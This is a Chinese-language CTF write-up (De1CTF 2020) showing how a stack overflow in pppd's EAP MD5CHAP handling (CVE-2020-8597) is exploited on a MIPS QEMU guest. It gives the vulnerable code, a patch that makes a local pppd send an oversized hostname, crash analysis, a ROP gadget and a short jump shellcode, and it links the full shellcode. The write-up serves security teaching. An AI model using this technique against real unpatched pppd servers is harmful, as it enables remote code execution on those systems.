## 总览

我们 使用最近发现的漏洞 通过mips虚拟机 来运行pppd

我们给出`vmlinux`，`rootfs.img`和`qemu`的启动脚本`start.sh`。

## 漏洞点

[CVE-2020-8597](https://nvd.nist.gov/vuln/detail/CVE-2020-8597)是在`pppd`（`2.4.2`〜`2.4.8`）中发现的栈溢出漏洞，当用户向服务器发送超大主机名时触发。

在 [eap_request](https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0)和[eap_response](https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719)函数中，`rhostname`是在堆栈中分配的256字节长的缓冲区。由于[不正确的大小检查](https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426)在`EAPT_MD5CHAP`分支，主机名大于256个字节长将被允许被复制到`rhostname`，从而导致堆栈溢出。

```
case EAPT_MD5CHAP:
[......]
  /* 不太可能发生. */
  if (vallen >= len + sizeof (rhostname)) {           //错误的大小检查
        dbglog("EAP: trimming really long peer name down");
        BCOPY(inp + vallen, rhostname, sizeof (rhostname) - 1);
        rhostname[sizeof (rhostname) - 1] = '\0';
  } else {
        BCOPY(inp + vallen, rhostname, len - vallen); // 栈溢出 
        rhostname[len - vallen] = '\0';
  }
```

## 调试

在开发之前，我们需要找到一种调试方法`pppd`。由于没有MIPS硬件，因此我必须在`qemu`仿真器中运行和调试它。

在`qemu`中，很容易重定向客户机，如通过添加几个选项的TCP连接和TTY设备连接到主机。我的想法是在启动一个`gdbserver`，并将`gdbserver`调试TCP端口和`pppd`tty 重定向到主机。

步骤1：解包`rootfs.img` with `cpio`。放置`gdbserver`在根目录中，您可以`gdbserver`从[此处](https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle)下载statically-built MIPS 二进制文件。

步骤2：编辑`etc/inittab`：

```
# Put a getty on the serial port
#ttyS0::respawn:/sbin/getty -L  ttyS0 0 vt100 # GENERIC_SERIAL
#ttyS0::sysinit:/pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
# Bring up network device
::sysinit:/sbin/ifup -a
# Launch gdbserver
ttyS0::sysinit:/gdbserver :1234 /pppd /dev/ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100

# Stuff to do for the 3-finger salute
```

`gdbserver`将在TCP端口上`1234`启动`pppd`，并在建立连接后启动。然后`pppd`将连接到tty设备`/dev/ttyS1`以发送和接收数据包。

步骤3：将这些`qemu`选项添加到`start.sh`：

```
-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty
```

`qemu`将重定向TCP端口`1234`并将其`/dev/ttyS1`从客户机重定向到主机。这样我们就可以`pppd`通过创建的pty设备进行通信`qemu`。

步骤4：重新打包`rootfs.img`并运行`start.sh`：

```
qemu-system-mipsel: -serial pty: char device redirected to /dev/pts/1 (label serial1)

[ Some boot messages... ]

Process /pppd created; pid = 112
Listening on port 1234
```

如果一切顺利，`qemu`将打印出pty设备路径，`gdbserver`在guest虚拟机中将启动并显示上述消息。现在，您可以使用`gdb-multiarch`调试`pppd`，设置断点并控制过程：

```
gdb-multiarch -ex 'set architecture mips'   \
              -ex 'target remote :1234'     \
              -ex 'file rootfs/pppd'        \
              -ex 'break *0x42F9A8'         \
              -ex 'continue'
```

与远程`pppd`进行交互的最简单方法是运行`pppd`具有以下选项的本地安装（`/dev/pts/1`是由创建的pty设备`qemu`）：

```
sudo pppd noauth local defaultroute debug nodetach /dev/pts/1 user admin password 1234568
```

在开发过程中，我们需要发送带有自定义payload的数据包，但是学习[点对点协议（PPP）](https://en.wikipedia.org/wiki/Point-to-Point_Protocol)和手动构造数据包的时间特别长，这在CTF竞赛中非常耗时。所以我决定patch `pppd`。

学习后[的源代码](https://github.com/paulusmack/ppp/)，我发现有一行，在`EAPT_MD5CHAP`分支中，`eap_request`函数发送主机名。

```
eap_chap_response(esp, id, hash, esp->es_client.ea_name,
    esp->es_client.ea_namelen);
```

修改代码以从本地文件读取从文件`/tmp/payload`读取paylaod。

```
char payload[1024] = {0};
FILE *fp = fopen("/tmp/sc", "r");
fread(payload, 1, 1024, fp);
fclose(fp);

eap_chap_response(esp, id, hash, payload, 1024);
```

保存并编译代码，然后将patched 程序重命名`pppd-payload`为以后使用。

## Exploitation

编写一个1024字节长的循环字符串`/tmp/sc`作为payload：

```
$ python -c 'from pwn import*; open("/tmp/sc", "wb").write(cyclic(1024))'
$ cat /tmp/sc
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
```

现在启动并连接远程`pppd`使用`gdb`，再运行patched `pppd`在本地机器：

```
sudo ./pppd-payload noauth local defaultroute debug nodetach /dev/pts/1 user admin password 1234568
```

不久，远程`pppd`崩溃并出现分段错误。从中`gdb`我们可以看到堆栈中的payload 

[![img](https://github.com/xf1les/ctf-writeups/raw/master/De1taCTF_2020/pppd/img/00.jpg)](https://github.com/xf1les/ctf-writeups/blob/master/De1taCTF_2020/pppd/img/00.jpg)

在探究了崩溃之后，我发现我们可以通过栈溢出控制 `s0`~`s4` 寄存器，寄存器里面存了返回地址

```
0x42f9a8 <eap_response+440>:	lw	ra,700(sp)
0x42f9ac <eap_response+444>:	lw	s4,696(sp)
0x42f9b0 <eap_response+448>:	lw	s3,692(sp)
0x42f9b4 <eap_response+452>:	lw	s2,688(sp)
0x42f9b8 <eap_response+456>:	lw	s1,684(sp)
0x42f9bc <eap_response+460>:	lw	s0,680(sp)
0x42f9c0 <eap_response+464>:	jr	ra
```

还发现了一个名为`sigjmp`的全局结构，该结构包含一个指针`__sp`（位于`0x45C71C`），指向我们payload的固定位置。

[![img](https://github.com/xf1les/ctf-writeups/raw/master/De1taCTF_2020/pppd/img/01.jpg)](https://github.com/xf1les/ctf-writeups/blob/master/De1taCTF_2020/pppd/img/01.jpg)

由于二进制文件没有启用NX或ASLR，因此我想到了通过跳到`__sp`指针指向的地址来执行有效负载中的Shellcode的想法。因此，我需要一个可以加载并从指针跳转到该地址的小工具。

幸运的是，我用`ROPgadget`找到了满意的gadget （位于`0x0043E310`），gadget 只是从存储在`s0`寄存器中的地址中加载一个字长的值，然后跳转到它。

```
0x43e310 <__libc_csu_init+96>:	lw	t9,0(s0)
0x43e314 <__libc_csu_init+100>:	addiu	s1,s1,1
0x43e318 <__libc_csu_init+104>:	move	a2,s5
0x43e31c <__libc_csu_init+108>:	move	a1,s4
0x43e320 <__libc_csu_init+112>:	jalr	t9
```



通过设置`$s0 = 0x45C71C`和`$ra = 0x0043E310`，我们可以在payload中执行任意shellcode。`__sp`指针指向的位置只有32个字节的空间。对于简单的cat-flag shellcode来说，这还远远不够。为了解决这个问题，我将shellcode分为两部分：跳转shellcode和getflag shellcode。

跳转shellcode只是跳转到getflag shellcode（仅16个字节长）：

```
lw  $t0, ($s0)  /* Load jump shellcode address from __sp pointer */
li  $t1, 0x268
sub $t9, $t0, $t1
j   $t9 /* jump to getflag shellcode */
```



getflag shellcode打开`/flag`fd并通过`sendfile`syscall 将标flag写入`ppp_fd`。 `ppp_fd`（存储在`0x45B1F0`）是`pppd`用于通过tty与客户端通信的文件描述符，因此我们可以通过捕获本地计算机和远程服务器之间的网络流量来接收该flag。请注意，将标志发送到stdout（fd `0`）是没有用的，因为我们不能访问除tty之外的任何其他流。

完整的shellcode可在[payload.py上找到](https://github.com/xf1les/ctf-writeups/blob/master/De1taCTF_2020/pppd/payload.py)。

## Get flag



运行`exp.sh`以利用远程服务器并获取flag （需要root特权）。它运行`socat`以将套接字流转换为远程服务器到pty设备，并`tcpdump`捕获网络流量。

`pppd-payload`是静态链接的，因此您无需安装其他依赖项。我还提供了一个[补丁程序，](https://github.com/xf1les/ctf-writeups/blob/master/De1taCTF_2020/pppd/pppd-payload.patch)因此，`pppd-payload`如果您不信任我的[程序](https://github.com/xf1les/ctf-writeups/blob/master/De1taCTF_2020/pppd/pppd-payload.patch)，则可以对其进行补丁程序和构建自己的程序（提醒：请勿运行不受信任的人提供的任何二进制文件，尤其是那些需要root特权才能运行的二进制文件）。

标志：De1CTF {PpPd_5tackOverf1ow_1s_1ntersT1ng}

## Reference

[paulusmack/ppp at ppp-2.4.7](https://github.com/paulusmack/ppp/tree/ppp-2.4.7)

[一个存在了17年的漏洞—pppd 栈溢出（cve-2020-8597）漏洞分析](https://www.anquanke.com/post/id/200639)